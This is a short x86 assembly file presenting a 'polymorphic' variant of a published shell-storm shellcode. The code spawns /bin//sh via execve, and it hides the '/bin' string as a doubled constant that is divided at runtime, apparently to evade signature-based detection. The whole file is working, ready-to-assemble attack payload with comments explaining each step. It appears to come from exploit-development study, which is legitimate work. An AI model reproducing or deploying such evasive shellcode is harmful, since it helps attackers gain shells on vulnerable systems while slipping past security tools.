; Polymorphic version of http://shell-storm.org/shellcode/files/shellcode-841.php
global _start

section .text

_start:
  mov ebx, 0xdcd2c45e        ; ebx =  twice the value of '/bin'
  shr ebx, 0x1               ; divide ebx by 2, once; source: https://www.felixcloutier.com/x86/sal:sar:shl:shr
  xor ecx, ecx               ; clear ecx
  push ecx                   ; push NULL
  push word 0x2f2f           ; push '//'
  mul ecx                    ; clear eax and edx
  mov al, 0xb                ; set execve
  mov word [esp+2], 0x6873   ; complete the '//sh' in esp
  push ebx                   ; push '/bin'
  mov ebx, esp               ; ebx = address of esp
  int 0x80                   ; syscall
